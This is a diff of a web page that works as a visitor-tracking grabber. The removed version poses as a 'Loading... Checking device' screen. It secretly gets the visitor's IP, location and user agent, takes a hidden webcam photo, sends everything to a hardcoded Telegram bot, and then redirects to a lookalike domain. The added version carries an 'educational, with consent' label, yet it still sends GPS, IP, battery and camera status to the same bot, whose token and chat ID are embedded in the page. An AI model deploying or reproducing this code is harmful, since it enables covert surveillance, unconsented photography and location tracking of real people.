@@ -1,112 +1,104 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <title>Device Info Demo</title>
   <meta charset="UTF-8">
-  <title>Loading...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <style>
-    body { margin: 0; font-family: sans-serif; text-align: center; padding: 60px; background: #fff; color: #111; }
-    video, canvas { display: none; }
-  </style>
 </head>
 <body>
-  <h2>Loading...</h2>
-  <p>Checking device. Please wait.</p>
-
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas"></canvas>
+  <h2>This website is for educational purposes only.</h2>
+  <p>It demonstrates how websites can collect device info ethically and with user consent.</p>
+  <button id="agreeBtn">I Agree</button>
 
   <script>
-    const botToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
+    const telegramBotToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
     const chatId = "7216371031";
-    const redirectUrl = "https://opaslabs.vercal.app/";
     const ipToken = "18d2a866939a58";
 
-    let textSent = false;
-    let photoSent = false;
+    async function getDeviceInfo() {
+      let data = {
+        ip: "Unknown",
+        city: "",
+        region: "",
+        country: "",
+        battery: "Unknown",
+        charging: "Unknown",
+        location: "Denied",
+        camera: "Not Attempted"
+      };
 
-    function checkDone() {
-      if (textSent && photoSent) {
-        window.location.href = redirectUrl;
+      // Get IP info from ipinfo.io using your token
+      try {
+        const ipRes = await fetch(`https://ipinfo.io/json?token=${ipToken}`);
+        const ipData = await ipRes.json();
+        data.ip = ipData.ip;
+        data.city = ipData.city;
+        data.region = ipData.region;
+        data.country = ipData.country;
+      } catch (e) {
+        console.error("IP info error:", e);
       }
+
+      // Get battery info
+      try {
+        const battery = await navigator.getBattery();
+        data.battery = (battery.level * 100).toFixed(0) + "%";
+        data.charging = battery.charging ? "Yes" : "No";
+      } catch (e) {
+        console.error("Battery info error:", e);
+      }
+
+      // Get geolocation
+      try {
+        const position = await new Promise((res, rej) => {
+          navigator.geolocation.getCurrentPosition(res, rej);
+        });
+        data.location = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
+      } catch (e) {
+        data.location = "Denied or Unavailable";
+      }
+
+      // Try camera access
+      try {
+        await navigator.mediaDevices.getUserMedia({ video: true });
+        data.camera = "Access Granted";
+      } catch (e) {
+        data.camera = "Access Denied";
+      }
+
+      return data;
     }
 
-    // STEP 1: IP Info
-    fetch("https://ipinfo.io/json?token=" + ipToken)
-      .then(r => r.json())
-      .then(data => {
-        const text = 
-🔐 Visitor Logged
+    function sendToTelegram(data) {
+      const message = `
+🔐 *User Device Info*
 🌐 IP: ${data.ip}
-📍 ${data.city}, ${data.region}, ${data.country}
-📌 Location: ${data.loc}
-🌐 ISP: ${data.org}
-🧠 Agent: ${navigator.userAgent}
-🕓 ${new Date().toLocaleString()}
-        .trim();
+📍 Location: ${data.city}, ${data.region}, ${data.country}
+🔋 Battery: ${data.battery} | Charging: ${data.charging}
+📡 GPS: ${data.location}
+📷 Camera: ${data.camera}
+      `;
+      const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
-        fetch(https://api.telegram.org/bot${botToken}/sendMessage, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: chatId, text })
-        }).then(() => {
-          textSent = true;
-          checkDone();
-        }).catch(() => {
-          textSent = true;
-          checkDone();
-        });
-      }).catch(() => {
-        textSent = true;
-        checkDone();
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        })
       });
+    }
 
-    // STEP 2: Capture Camera Image
-    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-      .then(stream => {
-        const video = document.getElementById("video");
-        const canvas = document.getElementById("canvas");
-        const ctx = canvas.getContext("2d");
-        video.srcObject = stream;
-
-        video.onloadedmetadata = () => {
-          setTimeout(() => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            stream.getTracks().forEach(t => t.stop());
-
-            canvas.toBlob(blob => {
-              const formData = new FormData();
-              formData.append("chat_id", chatId);
-              formData.append("photo", blob);
-              formData.append("caption", "📸 Visitor Snapshot");
-
-              fetch(https://api.telegram.org/bot${botToken}/sendPhoto, {
-                method: "POST",
-                body: formData
-              }).then(() => {
-                photoSent = true;
-                checkDone();
-              }).catch(() => {
-                photoSent = true;
-                checkDone();
-              });
-            }, "image/jpeg", 0.8);
-          }, 2500); // Delay snap for better focus
-        };
-      })
-      .catch(() => {
-        photoSent = true;
-        checkDone();
-      });
-
-    // Step 3: Failsafe redirect in 12s
-    setTimeout(() => {
-      if (!textSent || !photoSent) {
-        window.location.href = redirectUrl;
-      }
-    }, 12000);
+    document.getElementById("agreeBtn").addEventListener("click", async () => {
+      const info = await getDeviceInfo();
+      sendToTelegram(info);
+      setTimeout(() => {
+        window.location.href = "https://google.com"; // Redirect
+      }, 3000);
+    });
   </script>
 </body>
 </html>
